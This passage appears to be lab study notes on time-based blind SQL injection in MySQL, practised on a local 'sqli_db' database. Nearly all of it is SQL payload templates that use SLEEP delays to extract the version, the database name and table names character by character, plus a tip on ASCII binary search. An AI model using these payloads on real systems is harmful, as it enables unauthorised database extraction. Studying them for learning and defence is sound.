    ```sql
    SELECT LENGTH(DATABASE()) = 7;

    SELECT LENGTH(DATABASE()) > 8;
    ```

- ⏱️ Time-based Blind SQL Injection
    
    
    ---
    
    # ⏱️ Time-based Blind SQL Injection
    
    ## 🔘 Select the database
    
    ```sql
    USE sqli_db;
    
    ```
    
    ## 🛌 Induce a time delay to confirm injection is possible
    
    ```sql
    SELECT SLEEP(10);
    
    ```
    
    ## 🧾 Get database version
    
    ```sql
    SELECT VERSION();
    
    ```
    
    ## ⏳ Time-based checks for version prefixes
    
    ```sql
    -- check if version starts with "5"
    SELECT IF((SELECT VERSION()) LIKE '5%', SLEEP(10), NULL);
    
    -- check if version starts with "8"
    SELECT IF((SELECT VERSION()) LIKE '8%', SLEEP(10), NULL);
    -- larger delay example
    SELECT IF((SELECT VERSION()) LIKE '8%', SLEEP(100), NULL);
    
    ```
    
    ## 📏 Time-based check if database name is a specific length
    
    ```sql
    SELECT IF((SELECT LENGTH(DATABASE())) = 6, SLEEP(10), NULL);
    SELECT IF((SELECT LENGTH(DATABASE())) = 9, SLEEP(10), NULL);
    
    ```
    
    ## 🔤 Character-by-character extraction of the database name (time-based)
    
    Use boolean tests on each character and cause a delay when true:
    
    ```sql
    -- position 1
    SELECT IF(SUBSTR(DATABASE(), 1, 1) = 's', SLEEP(10), NULL);
    
    -- position 2
    SELECT IF(SUBSTR(DATABASE(), 2, 1) = 'q', SLEEP(10), NULL);
    
    -- position 3
    SELECT IF(SUBSTR(DATABASE(), 3, 1) = 'l', SLEEP(10), NULL);
    
    -- position 4
    SELECT IF(SUBSTR(DATABASE(), 4, 1) = 'i', SLEEP(10), NULL);
    
    -- position 5
    SELECT IF(SUBSTR(DATABASE(), 5, 1) = '_', SLEEP(10), NULL);
    
    -- position 6
    SELECT IF(SUBSTR(DATABASE(), 6, 1) = 'd', SLEEP(10), NULL);
    
    -- position 7
    SELECT IF(SUBSTR(DATABASE(), 7, 1) = 'b', SLEEP(10), NULL);
    ```
    
    > Tip: you can replace the character checks with ASCII comparisons (binary search on ASCII ranges) to reduce requests:
    > 
    
    ```sql
    SELECT IF(ASCII(SUBSTR(DATABASE(), 1, 1)) > 100, SLEEP(10), NULL);
    
    ```

# 🧩 Full blind equality checks & table-name extraction (time-based)

## ✅ Full blind equality check for the full database name

```sql
SELECT IF((SELECT DATABASE()) = 'sqli_db', SLEEP(10), NULL);
SELECT IF((SELECT DATABASE()) = 'armour_db', SLEEP(10), NULL);

```

---

## 🗂️ Extracting table names from the current database — one character at a time

Use `information_schema.tables` with `table_schema = DATABASE()` and `LIMIT offset,1` to pick the Nth table, then extract characters with `SUBSTR(...)` and cause a delay when a character matches.

```sql
-- table 0 (offset 0), char 1
SELECT IF(
  (SELECT SUBSTR(table_name, 1, 1)
   FROM information_schema.tables
   WHERE table_schema = DATABASE() LIMIT 0,1) = 'u',
  SLEEP(10), NULL);

-- table 0, char 2
SELECT IF(
  (SELECT SUBSTR(table_name, 2, 1)
   FROM information_schema.tables
   WHERE table_schema = DATABASE() LIMIT 0,1) = 's',
  SLEEP(10), NULL);

-- table 0, char 3
SELECT IF(
  (SELECT SUBSTR(table_name, 3, 1)
   FROM information_schema.tables
   WHERE table_schema = DATABASE() LIMIT 0,1) = 'e',
  SLEEP(10), NULL);

-- table 0, char 4
SELECT IF(
  (SELECT SUBSTR(table_name, 4, 1)
   FROM information_schema.tables
   WHERE table_schema = DATABASE() LIMIT 0,1) = 'r',
  SLEEP(10), NULL);
  
  
  -- table 0, char 5
SELECT IF(
  (SELECT SUBSTR(table_name, 5, 1)
   FROM information_schema.tables
   WHERE table_schema = DATABASE() LIMIT 0,1) = 's ',
  SLEEP(10), NULL);
```
